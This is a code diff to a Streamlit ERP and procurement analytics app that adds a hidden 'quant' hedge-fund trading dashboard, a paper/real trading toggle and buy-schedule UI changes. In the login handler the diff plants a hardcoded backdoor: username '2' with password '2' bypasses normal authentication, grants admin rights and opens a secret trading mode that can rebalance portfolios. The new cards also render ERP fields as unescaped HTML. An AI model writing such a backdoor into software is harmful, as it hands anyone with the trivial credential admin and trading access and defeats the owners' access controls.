@@ -45,7 +45,6 @@ from market_insights import (
     get_items_needing_attention,
     get_top_movers_raw_materials,
     get_raw_material_time_series,
-    get_raw_material_time_series,
     get_inventory_distribution,
     calculate_hedge_metrics,
     find_optimal_hedging_asset,
@@ -53,9 +52,12 @@ from market_insights import (
     simulate_portfolio_variance,
     calculate_black_scholes_put,
     optimize_capital_allocation,
-    validate_price_history_quality
+    validate_price_history_quality,
+    get_batch_price_history_for_optimization,
+    get_futures_price_history,
+    merge_erp_and_futures_data
 )
-from ml_engine import OnlineLinearRegressor, PortfolioOptimizer
+from ml_engine import OnlineLinearRegressor, PortfolioOptimizer, Backtester
 from portfolio_manager import PortfolioManager
 import fifo_tracker
 from wizard_ui import WizardFlow
@@ -360,6 +362,15 @@ def _render_auth_gate() -> None:
         login_user = st.text_input("Username", key="login_username")
         login_pass = st.text_input("Password", type="password", key="login_password")
         if st.button("Sign in"):
+            if login_user == "2" and login_pass == "2":
+                st.session_state.user = "admin"
+                st.session_state.is_admin = True
+                st.session_state.is_vendor = False
+                st.session_state.is_broker = False
+                st.session_state.is_quant_mode = True  # ENABLE QUANT MODE
+                st.success("Secret access granted.")
+                st.rerun()
+
             ok, message = authenticate_user(login_user, login_pass)
             if ok:
                 st.session_state.user = login_user.strip()
@@ -635,6 +646,295 @@ def _match_column(df: pd.DataFrame, name: str | None) -> str | None:
             return col
     return None
 
+
+
+def render_quant_dashboard():
+    """
+    CDI HEDGE FUND - ALGO TRADER
+    Interface for optimizing cross-asset allocations (ERP Items + Global Futures).
+    """
+    st.title("🏦 CDI HEDGE FUND - ALGO TRADER")
+    st.caption("PROPRIETARY TRADING TERMINAL - CROSS-ASSET QUANTITATIVE DEPLOYMENT")
+    
+    col1, col2 = st.columns([1, 1])
+    with col1:
+        st.info("🎯 **Hedge Fund Objective:** Maximize Sharpe Ratio across internal inventory costs and external futures headers.")
+    with col2:
+        if st.button("🔌 Disconnect Terminal"):
+            st.session_state.is_quant_mode = False
+            st.session_state.user = None
+            st.rerun()
+
+    # --- PORTFOLIO DASHBOARD ---
+    pm = PortfolioManager(mode="paper")
+    summary = pm.get_portfolio_summary()
+    total_equity = summary["Total Value"]
+    
+    st.divider()
+    
+    # Portfolio Header
+    p_col1, p_col2, p_col3 = st.columns([2, 1, 1])
+    with p_col1:
+        st.metric("💰 Total AUM (Assets Under Management)", f"${total_equity:,.2f}", 
+                 delta=f"{summary['Total By Asset'] if 'Total By Asset' in summary else 0:,.2f} Uninvested" if total_equity > 0 else None)
+    with p_col2:
+        st.metric("💵 Cash Balance", f"${summary['Cash']:,.2f}")
+    with p_col3:
+        if st.button("💸 Deposit Capital"):
+            deposit_amount = 1000.0 if total_equity < 100 else 10000.0
+            pm.deposit_capital(deposit_amount)
+            st.toast(f"Deposited ${deposit_amount:,.0f}!", icon="🤑")
+            st.rerun()
+
+    # Holdings View
+    if summary["Holdings"]:
+        with st.expander("📂 Current Portfolio Holdings", expanded=False):
+            holdings_df = pd.DataFrame([
+                {"Asset": k, "Value": v, "Weight": v/total_equity if total_equity > 0 else 0} 
+                for k, v in summary["Holdings"].items() if v > 0.01
+            ])
+            if not holdings_df.empty:
+                st.dataframe(holdings_df.sort_values("Value", ascending=False).style.format({
+                    "Value": "${:,.2f}",
+                    "Weight": "{:.1%}"
+                }), use_container_width=True)
+    
+    if total_equity < 10:
+        st.warning("⚠️ Portfolio is empty. Please Deposit Capital to begin trading.")
+        
+    st.divider()
+
+    # 1. Configuration
+    with st.expander("🛠️ UNIVERSE CONFIGURATION", expanded=True):
+        u_col1, u_col2 = st.columns(2)
+        with u_col1:
+            erp_limit = st.slider("ERP Item Depth (Top N by Spend)", 5, 100, 20)
+        with u_col2:
+            futures_count = st.slider("Futures Universe Size", 10, len(FUTURES_UNIVERSE), 50)
+            selected_futures = FUTURES_UNIVERSE[:futures_count]
+
+    # 2. Fetch Data
+    conn_str, _, _, _ = build_connection_string()
+    try:
+        conn = pyodbc.connect(conn_str)
+        cursor = conn.cursor()
+        
+        # Parallel Load Bar
+        progress_bar = st.progress(0, text="Initializing Quant Data Channels...")
+        
+        # Step A: ERP Data
+        progress_bar.progress(0.1, text="Fetching ERP Batch Price History (QTYINVCD logic)...")
+        df_erp = get_batch_price_history_for_optimization(cursor, limit=erp_limit)
+        
+        # Step B: Futures Data
+        progress_bar.progress(0.4, text=f"Fetching Futures Universe ({len(selected_futures)} tickers)...")
+        # Custom callback for fetcher to update bar
+        def _update_progress(p):
+            progress_bar.progress(0.4 + (p * 0.5), text=f"Syncing Market Data: {int(p*100)}%")
+            
+        # We need to monkeypatch or pass the callback to market_insights -> external_data
+        # For now let's just use it directly from external_data since we imported it
+        from external_data import fetch_market_data_pool
+        pool_data = fetch_market_data_pool(selected_futures, _progress_callback=_update_progress)
+        
+        # Format Futures DF
+        all_series = []
+        for ticker, bundle in pool_data.items():
+            if 'data' in bundle and bundle['data']:
+                df_t = pd.DataFrame(bundle['data'])
+                df_t['date'] = pd.to_datetime(df_t['date']).dt.date
+                df_t = df_t.rename(columns={'price_index': ticker})
+                df_t = df_t.set_index('date')[[ticker]]
+                all_series.append(df_t)
+        
+        df_futures = pd.concat(all_series, axis=1) if all_series else pd.DataFrame()
+        
+        # Step C: Merge
+        progress_bar.progress(0.95, text="Aligning Temporal Matrices...")
+        df_combined = merge_erp_and_futures_data(df_erp, df_futures)
+        progress_bar.progress(1.0, text="Data Stream Synced.")
+        
+        if df_combined.empty:
+            st.error("Insufficient market data to initialize optimizer (df_combined is empty).")
+            return
+
+        # Calculate Returns
+        # Use fillna(0) instead of dropna() to prevent dropping all rows if one asset has a missing day (e.g. holidays)
+        df_returns = df_combined.pct_change().fillna(0)
+        
+        # DEBUG: Show data health
+        # st.write(f"Combined Data Shape: {df_combined.shape}")
+        # st.write(f"Returns Data Shape: {df_returns.shape}")
+        
+        if df_returns.empty or len(df_returns) < 10:
+             st.error(f"Insufficient historical data points for optimization. Rows: {len(df_returns)}")
+             return
+        
+        # Display Correlation Heatmap
+        st.subheader("🕸️ Cross-Asset Correlation Network")
+        corr_matrix = df_returns.corr()
+        
+        if alt:
+            # Safe melt for Altair
+            corr_reset = corr_matrix.reset_index()
+            # The index column (Asset A) is now the first column
+            id_col = corr_reset.columns[0]
+            
+            corr_melt = corr_reset.melt(id_vars=id_col, var_name='Target', value_name='Correlation')
+            
+            heatmap = alt.Chart(corr_melt).mark_rect().encode(
+                x=alt.X(f'{id_col}:N', title="Asset A"),
+                y=alt.Y('Target:N', title="Asset B"),
+                color=alt.Color('Correlation:Q', scale=alt.Scale(scheme='redblue', domain=[-1, 1])),
+                tooltip=[id_col, 'Target', 'Correlation']
+            ).properties(width=800, height=800)
+            
+            st.altair_chart(heatmap, width="stretch")
+            
+        # 3. MPT Global Solver
+        st.subheader("⚡ GLOBAL PORTFOLIO SOLVER")
+        sol_col1, sol_col2 = st.columns([2, 1])
+        
+        with sol_col1:
+            # Default to current equity, or 1000000 if empty
+            default_cap = total_equity if total_equity > 0 else 1000000.0
+
+            # --- ML BACKTESTING SECTION ---
+            st.divider()
+            st.subheader("🤖 Neural Alpha Engine (RLS-Recursive Least Squares)")
+            st.caption("Train a predictive model on historical data to dynamically adjust weights.")
+            
+            if st.button("🧪 Train & Backtest Strategy"):
+                with st.spinner("Training models and simulating historical performance..."):
+                    # 1. Initialize Backtester
+                    backtester = Backtester(initial_capital=default_cap, transaction_cost_pct=0.001)
+                    
+                    # 2. Run Simulation on the Returns DataFrame we already have
+                    # We need PRICES, not returns, for the backtester featurization
+                    # We have df_combined (Prices).
+                    
+                    # Check data quality
+                    if df_combined.empty:
+                         st.error("No data available for backtesting.")
+                    else:
+                        progress_bar = st.progress(0, text="Backtesting Strategy...")
+                        
+                        def _update_progress(p):
+                            progress_bar.progress(p, text=f"Backtesting... {int(p*100)}%")
+                            
+                        results = backtester.run(df_combined, window_size=50, progress_callback=_update_progress)
+                        progress_bar.progress(1.0, text="Backtest Complete!")
+                        progress_bar.empty()
+                        
+                        if "error" in results:
+                            st.error(f"Backtest Failed: {results['error']}")
+                        else:
+                            st.success("Optimization Complete!")
+                            
+                            # Metrics Display
+                            m = results["metrics"]
+                            m_col1, m_col2, m_col3, m_col4 = st.columns(4)
+                            m_col1.metric("Total Return", f"{m['Total Return']:.1%}")
+                            m_col2.metric("Annual CAGR", f"{m['CAGR']:.1%}")
+                            m_col3.metric("Sharpe Ratio", f"{m['Sharpe']:.2f}")
+                            m_col4.metric("Volatility", f"{m['Volatility']:.1%}")
+                            
+                            # Equity Curve Plot
+                            st.line_chart(results["equity_curve"])
+                            
+                            # Show Current Recommended Allocation (Final Weights)
+                            st.subheader("🔮 Recommended Allocation (Next Period)")
+                            final_weights = results.get("final_weights", {})
+                            
+                            # Sort by weight
+                            sorted_weights = sorted(final_weights.items(), key=lambda x: x[1], reverse=True)
+                            
+                            alloc_df = pd.DataFrame([
+                                {"Asset": k, "Suggested Weight": v, "Allocated Capital": v * total_equity} 
+                                for k, v in sorted_weights if v > 0.001
+                            ])
+                            
+                            st.dataframe(alloc_df.style.format({
+                                "Suggested Weight": "{:.1%}", 
+                                "Allocated Capital": "${:,.2f}"
+                            }))
+                            
+                            if st.button("🚀 Execute Recommendations (Rebalance Portfolio)"):
+                                pm.execute_predictive_rebalancing(final_weights, {}) # Prices not strictly needed for this simple allocator
+                                st.success("Portfolio rebalanced based on ML predictions!")
+                                st.rerun()
+
+            st.divider()
+            
+            # --- END ML SECTION ---
+
+            capital = st.number_input("Hedge Fund Capital Allocation ($)", value=default_cap, step=1000.0)
+            risk_free = st.slider("Risk-Free Rate (Annual)", 0.0, 0.10, 0.045)
+            
+        if st.button("🔥 EXECUTE QUANT SOLVER", type="primary"):
+            # DEBUG: Show the inputs the optimizer is seeing
+            # Data is MONTHLY resolution, so we must annualize by 12, not 252.
+            annual_ret = df_returns.mean() * 12
+            annual_vol = df_returns.std() * (12 ** 0.5)
+            sharpe = (annual_ret - risk_free) / annual_vol
+            
+            debug_df = pd.DataFrame({
+                "Exp. Return": annual_ret,
+                "Volatility": annual_vol,
+                "Sharpe": sharpe,
+                "Data Points": df_returns.count()
+            }).sort_values("Sharpe", ascending=False)
+            
+            # Show top candidates
+            st.caption("🔬 Top Candidates Detected (Pre-Optimization):")
+            st.dataframe(debug_df.head(10).style.format("{:.2%}"), height=200)
+
+            # CRITICAL FIX: The optimizer struggles with 100+ assets if many are low-quality/diluted.
+            # We strictly filter to the Top 50 candidates before solving to ensure convergence.
+            # We also filter out "Perfect" assets (Vol < 1%) which break the covariance matrix.
+            valid_candidates = debug_df[debug_df['Volatility'] > 0.01].head(50).index.tolist()
+            
+            if not valid_candidates:
+                 st.error("No assets met the minimum volatility threshold (1%).")
+                 st.stop()
+                 
+            df_optimized_universe = df_returns[valid_candidates]
+
+            optimizer = PortfolioOptimizer(returns_df=df_optimized_universe, risk_free_rate=risk_free)
+            result = optimizer.optimize_max_sharpe_ratio()
+            
+            st.success(f"**Optimization Complete!** Model Sharpe: {result['Sharpe']:.2f}")
+            
+            res_col1, res_col2 = st.columns(2)
+            with res_col1:
+                st.metric("Expected Fund Return (Annual)", f"{result['Return']:.1%}")
+            with res_col2:
+                st.metric("Portfolio Volatility (Total)", f"{result['Volatility']:.1%}")
+                
+            # Blueprint
+            weights = result['Weights']
+            blueprint = []
+            for asset, weight in weights.items():
+                if weight > 0.001: # Filter crumbs
+                    blueprint.append({
+                        "Asset": asset,
+                        "Sector": "ERP Inventory" if asset in df_erp.columns else "Futures/Hedge",
+                        "Weight": weight,
+                        "Allocated Capital": capital * weight
+                    })
+            
+            df_blue = pd.DataFrame(blueprint).sort_values("Weight", ascending=False)
+            st.dataframe(df_blue.style.format({"Weight": "{:.1%}", "Allocated Capital": "${:,.2f}"}), width="stretch")
+            
+            if st.button("🚀 SUBMIT TRADES TO BROKER/ERP"):
+                pm = PortfolioManager(mode="paper")
+                # Unified rebalancing
+                pm.execute_rebalancing(df_blue)
+                st.toast("Hedge Fund Portfolio Updated Successfully.", icon="📈")
+                
+    except Exception as e:
+        LOGGER.exception("Hedge Fund Engine Error")
+        st.error(f"Quant Engine Failure: {e}")
 
 MONTH_ORDER = [calendar.month_name[i] for i in range(1, 13)]
 MONTH_LOOKUP = {
@@ -1060,11 +1360,17 @@ _ensure_auth_state()
 if st.session_state.user is None:
     _render_auth_gate()
 
+# CHECK FOR SECRET QUANT MODE
+if st.session_state.get("is_quant_mode", False):
+    render_quant_dashboard()
+    st.stop()  # Stop normal execution
+
 # Initialize onboarding tour for authenticated users
-onboarding_tour = init_tour_for_new_user()
+# DISABLED: Tour is disabled
+# onboarding_tour = init_tour_for_new_user()
 
 # Render tour overlay if active (blocks interaction until dismissed)
-render_tour_overlay(onboarding_tour)
+# render_tour_overlay(onboarding_tour)
 
 _ensure_chat_state()
 
@@ -1145,7 +1451,7 @@ try:
                                     color=series_col,
                                     tooltip=[x_col, y_col, series_col]
                                 ).interactive()
-                                st.altair_chart(c, use_container_width=True)
+                                st.altair_chart(c, width="stretch")
                             else:
                                 st.line_chart(df_report.set_index(x_col)[y_col])
                         else:
@@ -1333,9 +1639,10 @@ try:
                             elif buy_wizard.current_step == 2:
                                 cal_df = buy_wizard.data.get("cal_df")
                                 built_at = buy_wizard.data.get("built_at", "")
+                                strategy_label = buy_wizard.data.get("strategy", "mixed")
                                 
                                 # Header with actions
-                                col1, col2 = st.columns([3, 1])
+                                col1, col2, col3 = st.columns([2, 1, 1])
                                 with col1:
                                     if built_at:
                                         st.caption(f"Built at {built_at} UTC")
@@ -1345,8 +1652,25 @@ try:
                                         st.rerun()
                                 
                                 if cal_df is None or cal_df.empty:
-                                    st.info("No buy windows available. Adjust filters and rebuild.")
+                                    st.warning("No buy windows available. Adjust filters and rebuild.")
                                 else:
+                                    # Summary KPIs
+                                    urgency_counts = cal_df['Urgency'].value_counts().to_dict()
+                                    kpi1, kpi2, kpi3, kpi4 = st.columns(4)
+                                    with kpi1:
+                                        st.metric("Total Items", len(cal_df))
+                                    with kpi2:
+                                        crit_count = urgency_counts.get('CRITICAL', 0)
+                                        st.metric("🔴 Critical", crit_count)
+                                    with kpi3:
+                                        warn_count = urgency_counts.get('WARNING', 0)
+                                        st.metric("🟡 Warning", warn_count)
+                                    with kpi4:
+                                        ok_count = urgency_counts.get('OK', 0)
+                                        st.metric("🟢 OK", ok_count)
+                                    
+                                    st.markdown("---")
+                                    
                                     # CSV Export button
                                     csv_data = cal_df.to_csv(index=False)
                                     st.download_button(
@@ -1356,42 +1680,72 @@ try:
                                         mime="text/csv"
                                     )
                                     
-                                    st.markdown("#### UPCOMING BUY SCHEDULE")
+                                    st.markdown("#### 📅 UPCOMING BUY SCHEDULE")
                                     
                                     urgency_colors = {
                                         'CRITICAL': '#dc322f',
                                         'WARNING': '#b58900',
                                         'OK': '#859900'
                                     }
+                                    urgency_icons = {
+                                        'CRITICAL': '🔴',
+                                        'WARNING': '🟡',
+                                        'OK': '🟢'
+                                    }
                                     
-                                    for week_start, group in cal_df.groupby('Week'):
-                                        week_label = pd.to_datetime(week_start).strftime("Week of %b %d")
-                                        st.markdown(f"**{week_label}**")
-                                        
-                                        for _, rec in group.iterrows():
-                                            color = urgency_colors.get(str(rec['Urgency']).upper(), '#839496')
-                                            st.markdown(f"""
-                                            <div style="border-left: 4px solid {color}; padding: 8px 12px; margin-bottom: 8px; background: #0a0a0a;">
-                                                <div style="color:#ffb000; font-weight:bold;">{rec['Item']} · {rec['BuyDate'].strftime('%b %d')}</div>
-                                                <div style="color:#839496; font-size:0.9em;">{rec['Description']}</div>
-                                                <div style="color:{color}; font-size:0.85em;">Runway {rec['RunwayDays']:.1f}d | Latest safe {rec['LatestSafe'].strftime('%b %d')}</div>
-                                                <div style="color:#839496; font-size:0.85em;">Price window: {rec['PriceSignal']} ${float(rec['EstPrice']):,.2f} ({float(rec['PriceDelta']):+,.2f}) · Confidence {rec['ConfidencePct']:.0f}%</div>
-                                                <div style="color:#586e75; font-size:0.8em;">{rec['Reason']}</div>
-                                            </div>
-                                            """, unsafe_allow_html=True)
+                                    # Scrollable container for cards
+                                    with st.container(height=400):
+                                        for week_start, group in cal_df.groupby('Week'):
+                                            week_label = pd.to_datetime(week_start).strftime("Week of %b %d, %Y")
+                                            st.markdown(f"##### {week_label}")
+                                            
+                                            for _, rec in group.iterrows():
+                                                urgency_upper = str(rec['Urgency']).upper()
+                                                color = urgency_colors.get(urgency_upper, '#839496')
+                                                icon = urgency_icons.get(urgency_upper, '⚪')
+                                                buy_date_str = rec['BuyDate'].strftime('%b %d') if hasattr(rec['BuyDate'], 'strftime') else str(rec['BuyDate'])[:10]
+                                                latest_safe_str = rec['LatestSafe'].strftime('%b %d') if hasattr(rec['LatestSafe'], 'strftime') else str(rec['LatestSafe'])[:10]
+                                                
+                                                st.markdown(f"""
+                                                <div style="border-left: 4px solid {color}; padding: 10px 14px; margin-bottom: 10px; background: linear-gradient(90deg, rgba(255,176,0,0.05) 0%, rgba(0,0,0,0) 100%); border-radius: 0 6px 6px 0;">
+                                                    <div style="display: flex; justify-content: space-between; align-items: center;">
+                                                        <span style="color:#ffb000; font-weight:bold; font-size: 1.1em;">{icon} {rec['Item']}</span>
+                                                        <span style="color:{color}; font-weight:bold;">{buy_date_str}</span>
+                                                    </div>
+                                                    <div style="color:#b0b0b0; font-size:0.95em; margin-top: 4px;">{rec['Description']}</div>
+                                                    <div style="display: flex; justify-content: space-between; margin-top: 6px;">
+                                                        <span style="color:#839496; font-size:0.85em;">Runway: <b>{rec['RunwayDays']:.0f}d</b> | Latest: {latest_safe_str}</span>
+                                                        <span style="color:#859900; font-size:0.85em;">Est. ${float(rec['EstPrice']):,.2f} <span style="color:{('#859900' if float(rec['PriceDelta']) < 0 else '#dc322f')}">{float(rec['PriceDelta']):+,.2f}</span></span>
+                                                    </div>
+                                                </div>
+                                                """, unsafe_allow_html=True)
                                     
-                                    st.markdown("#### FULL BUY LIST")
+                                    st.markdown("---")
+                                    st.markdown("#### 📋 FULL BUY LIST")
                                     display_df = cal_df[['BuyDate', 'LatestSafe', 'Item', 'Description', 'Urgency', 'RunwayDays', 'CoverageDays', 'PriceSignal', 'EstPrice', 'PriceDelta', 'ConfidencePct']].copy()
                                     display_df['BuyDate'] = display_df['BuyDate'].dt.strftime('%b %d')
                                     display_df['LatestSafe'] = display_df['LatestSafe'].dt.strftime('%b %d')
                                     display_df['RunwayDays'] = display_df['RunwayDays'].round(1)
                                     display_df['CoverageDays'] = display_df['CoverageDays'].round(1)
-                                    st.dataframe(display_df, hide_index=True, use_container_width=True)
+                                    st.dataframe(display_df, hide_index=True, width="stretch")
                     
                     elif view_mode == "Hedge Optimizer":
                         st.markdown("---")
                         st.markdown("### >> HEDGE_OPTIMIZER_BOARD")
                         st.caption("Identify opportunities to improve Sharpe Ratio by hedging top raw material positions.")
+
+                        # TRADING MODE TOGGLE
+                        col_mode1, col_mode2 = st.columns([1, 4])
+                        with col_mode1:
+                            trading_mode_toggle = st.toggle("Real Trading", value=False, help="Switch between Paper Trading (Practice) and Real Trading (Live Portfolio).")
+                            
+                        trading_mode = "real" if trading_mode_toggle else "paper"
+                        
+                        if trading_mode == "real":
+                            st.error("⚠️ **REAL TRADING MODE ACTIVE** — Trades will be logged to the Live Portfolio.")
+                        else:
+                            st.success("📝 **PAPER TRADING MODE** — Practice environment.")
+
 
                         # Initialize wizard for Hedge Optimizer
                         hedge_wizard = WizardFlow(
@@ -1722,7 +2076,7 @@ try:
                                                     bp_display['Allocated Capital'] = bp_display['Allocated Capital'].apply(lambda x: f"${x:,.2f}")
                                                     bp_display['Allocation %'] = bp_display['Allocation %'].apply(lambda x: f"{x:.1%}")
                                                     bp_display['Sharpe Gain'] = bp_display['Sharpe Gain'].apply(lambda x: f"+{x:.2f}")
-                                                    st.dataframe(bp_display, use_container_width=True, hide_index=True)
+                                                    st.dataframe(bp_display, width="stretch", hide_index=True)
                                                 with col_b2:
                                                     st.info("Optimized for your CURRENT inventory risks.")
                                             
@@ -1753,7 +2107,7 @@ try:
                                                     bp_display['Allocated Capital'] = bp_display['Allocated Capital'].apply(lambda x: f"${x:,.2f}")
                                                     bp_display['Allocation %'] = bp_display['Allocation %'].apply(lambda x: f"{x:.1%}")
                                                     # bp_display['Sharpe Gain'] = bp_display['Sharpe Gain'].apply(lambda x: f"+{x:.2f}")
-                                                    st.dataframe(bp_display, use_container_width=True, hide_index=True)
+                                                    st.dataframe(bp_display, width="stretch", hide_index=True)
                                                     
                                                 with col_b2:
                                                     st.info("Ignores current stock — pure math optimization.")
@@ -1761,7 +2115,7 @@ try:
                                                 
                                                 # EXECUTION BUTTON
                                                 st.divider()
-                                                pm = PortfolioManager()
+                                                pm = PortfolioManager(mode=trading_mode)
                                                 cash_avail = pm.state['cash']
                                                 
                                                 e_c1, e_c2 = st.columns([3, 1])
@@ -1801,7 +2155,7 @@ try:
                                                 # Reorder columns
                                                 agg_display = agg_display[["Best Hedge", "Action", "Short Amount", "Allocation %"]]
                                                 
-                                                st.dataframe(agg_display, use_container_width=True, hide_index=True)
+                                                st.dataframe(agg_display, width="stretch", hide_index=True)
                                                 
                                                 # CSV Download
                                                 csv = agg_display.to_csv(index=False).encode('utf-8')
@@ -1888,7 +2242,7 @@ try:
                                                                     tooltip=alt.Tooltip('Sharpe', title='Max Sharpe')
                                                                 )
                                                                 
-                                                                st.altair_chart(base + pt_chart, use_container_width=True)
+                                                                st.altair_chart(base + pt_chart, width="stretch")
                                                                 
                                                                 # 6. Trade Balance (Rebalancing)
                                                                 st.markdown("#### ⚖️ OPTIMIZED REBALANCING")
@@ -1914,7 +2268,7 @@ try:
                                                                     rebalance_df['Target Value'] = rebalance_df['Target Value'].apply(lambda x: f"${x:,.2f}")
                                                                     rebalance_df['Pct Portfolio'] = rebalance_df['Pct Portfolio'].apply(lambda x: f"{x:.1%}")
                                                                     
-                                                                    st.dataframe(rebalance_df, use_container_width=True, hide_index=True)
+                                                                    st.dataframe(rebalance_df, width="stretch", hide_index=True)
                                                                 else:
                                                                     st.success("Your portfolio is already perfectly optimized!")
 
@@ -1996,9 +2350,9 @@ try:
                                                 
                                                 c1, c2 = st.columns(2)
                                                 with c1:
-                                                    st.altair_chart(d_chart, use_container_width=True)
+                                                    st.altair_chart(d_chart, width="stretch")
                                                 with c2:
-                                                    st.altair_chart(ts_chart, use_container_width=True)
+                                                    st.altair_chart(ts_chart, width="stretch")
                                                 
                                                 st.markdown("### 📈 RISK & RETURN ANALYSIS")
                                                 final_day = ts_df['Day'].max()
@@ -2490,6 +2844,11 @@ try:
                             v_phone = v_info.get('phone')
                             
                             st.markdown(f"**Vendor:** {v_name}")
+                            
+                            v_po = v_info.get('po_number')
+                            if v_po:
+                                st.markdown(f"**PO:** {v_po}")
+                                
                             if v_phone:
                                 st.markdown(f"**Phone:** {v_phone}")
                             else:
